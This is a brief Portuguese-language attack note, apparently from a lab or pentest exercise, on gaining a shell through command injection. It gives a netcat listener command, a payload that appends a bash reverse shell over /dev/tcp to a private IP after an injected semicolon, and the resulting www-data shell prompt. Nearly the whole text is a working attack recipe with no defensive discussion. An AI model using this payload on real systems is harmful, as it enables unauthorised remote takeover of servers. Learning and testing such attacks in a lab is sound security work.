# Remote Code Execution (RCE)

## 🎯 Objetivo
Obter shell no servidor.

---

## 🔧 Listener (Kali)

```bash
nc -lvnp 4444
```

## 💀 Payload

```
127.0.0.1; bash -i >& /dev/tcp/192.168.56.20/4444 0>&1
```

## 📊 Resultado

Conexão recebida:
```
www-data@ubuntu:/$
```
